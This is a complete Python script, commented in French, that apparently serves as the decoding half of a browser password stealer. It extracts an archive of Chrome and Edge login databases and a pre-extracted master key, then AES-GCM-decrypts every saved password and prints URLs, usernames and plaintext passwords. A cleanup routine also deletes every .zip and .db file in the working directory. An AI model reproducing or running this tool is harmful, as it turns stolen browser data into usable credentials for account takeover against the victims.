import base64
import os
import shutil
import sqlite3
import zipfile
import re
from colorama import init
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from prettytable import PrettyTable

# Initialiser Colorama
init(autoreset=True)


def clean_files():
    try:
        shutil.rmtree("extracted_files")
    except PermissionError as e:
        print(f"Erreur de permission : {e}")
    except Exception as e:
        print(f"Erreur inattendue lors de la suppression du dossier : {e}")

    for file in os.listdir():
        if file.endswith(".zip") or file.endswith(".db"):
            try:
                os.remove(file)
            except PermissionError as e:
                print(f"Erreur de permission : {e}")
    try:
        os.remove("resultats.txt")
        os.remove("resultats.csv")
        os.remove("resultat.xlsx")
    except FileNotFoundError:
        pass
    print("Nettoyage terminés.")


def extract_zip(zip_path):
    extracted_folder = "extracted_files"
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extracted_folder)
    return extracted_folder


def find_files(extracted_folder):
    login_data_files = {}
    main_folder = os.path.join(extracted_folder, os.listdir(extracted_folder)[0])

    for browser_name in os.listdir(main_folder):
        if browser_name not in ["google", "edge"]:
            print(f"Le navigateur {browser_name} n'est pas pris en charge.")
            continue
        browser_folder = os.path.join(main_folder, browser_name)
        login_data_files[browser_name] = {
            "login_data_files": [],
            "local_state_file": None,
            "decrypted_key_file": None
        }

        for file in os.listdir(browser_folder):
            file_path = os.path.join(browser_folder, file)

            if file.startswith("LoginData"):
                login_data_files[browser_name]["login_data_files"].append(file_path)
            elif file == "LocalState":
                login_data_files[browser_name]["local_state_file"] = file_path
            elif file.lower() == "decrypted_key.txt":  # Correction ici
                login_data_files[browser_name]["decrypted_key_file"] = file_path

        # Vérification des fichiers nécessaires
        if not login_data_files[browser_name]["login_data_files"] or not login_data_files[browser_name]["local_state_file"] or not login_data_files[browser_name]["decrypted_key_file"]:
            raise FileNotFoundError(
                f"Les fichiers LoginData, LocalState ou decrypted_key.txt sont manquants dans le dossier {browser_name}."
            )

    return login_data_files


def decrypt_key(decrypted_key_path):
    if not os.path.exists(decrypted_key_path):
        raise FileNotFoundError("Le fichier Decrypted_Key est introuvable.")

    with open(decrypted_key_path, "r", encoding="utf-8") as f:
        decrypted_key_base64 = f.read().strip()
    decrypted_key = base64.b64decode(decrypted_key_base64)

    return decrypted_key


def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        tag = encrypted_password[-16:]
        encrypted_password = encrypted_password[15:-16]

        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_password = decryptor.update(encrypted_password) + decryptor.finalize()
        return decrypted_password.decode('utf-8', errors='ignore')
    except Exception as e:
        raise ValueError(f"Erreur lors du déchiffrement : {str(e)}")


def clean_text(text):
    # Remplace les caractères non imprimables par un espace
    return re.sub(r'[\x00-\x1F\x7F-\x9F]', ' ', text)


def get_passwords(login_data, key, browser="Unknown Browser", profile="Default"):
    shutil.copy2(login_data, "login_data.db")
    conn = sqlite3.connect("login_data.db")
    table = PrettyTable()
    table.field_names = ["Status", "Browser", "Profile", "URL", "Username", "Decrypted Password", "Error"]

    profile = profile.replace("LoginData_", "Profile ").strip()
    if profile == "Profile 0":
        profile = "Default"

    try:
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")

        for url, username, encrypted_password in cursor.fetchall():
            if encrypted_password:
                try:
                    decrypted_password = decrypt_password(encrypted_password, key)
                    # Nettoyage des valeurs avant de les ajouter à la table
                    table.add_row([
                        clean_text("V"),
                        clean_text(browser),
                        clean_text(profile),
                        clean_text(url),
                        clean_text(username),
                        clean_text(decrypted_password),
                        clean_text("")
                    ])
                except ValueError as e:
                    table.add_row([
                        clean_text("X"),
                        clean_text(browser),
                        clean_text(profile),
                        clean_text(url),
                        clean_text(username),
                        clean_text(""),
                        clean_text(str(e))
                    ])

    finally:
        conn.close()

    os.remove("login_data.db")
    return table


def decrypt_passwords(zip_path):
    extracted_folder = extract_zip(zip_path)
    browser_files = find_files(extracted_folder)

    final_table = PrettyTable()
    final_table.field_names = ["Status", "Browser", "Profile", "URL", "Username", "Decrypted Password", "Error"]

    for browser, files in browser_files.items():
        key = decrypt_key(files["decrypted_key_file"])
        for login_data in files["login_data_files"]:
            profile_name = os.path.basename(login_data)
            passwords_table = get_passwords(login_data, key, browser=browser, profile=profile_name)
            final_table.add_rows(passwords_table.rows)

    shutil.rmtree(extracted_folder)  # Supprimer les fichiers extraits après traitement
    return final_table


def main():
    try:
        zip_path = "test.zip"  # Peut être rendu paramétrable
        passwords_table = decrypt_passwords(zip_path)
        print(passwords_table)
    except Exception as e:
        print(f"Erreur : {e}")


if __name__ == "__main__":
    main()
